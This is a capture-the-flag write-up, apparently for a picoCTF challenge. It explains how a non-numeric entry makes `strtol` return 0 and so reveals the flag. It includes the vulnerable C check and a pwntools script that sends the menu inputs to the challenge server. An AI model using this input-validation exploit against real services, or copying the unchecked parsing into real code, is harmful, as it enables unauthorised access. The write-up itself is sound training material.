I started off by hunting down where the flag was being outputted in the source
code and quickly identified it to be in the `data_read` function which gets
invoked when you send through `2` to the interactive menu:

```c
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
}
```

The goal, it seems, is to get the condition to pass. To accomplish this, we must
get `strtol(entry, NULL, 10)` to return `0` , thereby causing `((entry_number = 0) == 0)`

to return evaluate to `true` and proceed to dump the flag.

The crucial observation to make is that we get to control the value of `entry`

in `data_read` via the following line:

```c
r = tgetinput(entry, 4);  // 1. Reads input string into `entry`.
```

If we can send in a non-numeric input like "a", then this will result in 
`strtol(entry, NULL, 10)` returning `0` , which is what we want to achieve.

Before we can even invoke `data_read` however, it seems that there must exist
data in the 'database'. To get past this is straightforward &mdash; we just have
to invoke `data_write` first with any non-empty valid input, and then we'll be
able to invoke `data_read` right after and send in "a" to leak the flag. 
The following Python script executes this idea and obtains the flag for us.

```python
from pwn import *

context.log_level = "critical"

def solve():
    io = remote("saturn.picoctf.net", 55825)

    # Invoke `data_write`:
    io.sendline("1".encode())
    io.sendline("a".encode())   # Please enter your data:
    io.sendline("1".encode())   # Please enter the length of your data:

    # Invoke `data_read`:
    io.sendline("2".encode())
    io.sendline("a".encode())   # Please enter the entry number of your data:

    # Extract the leaked flag.
    output = io.recvrepeat(1)
    print(output)

    io.close()

solve()
```
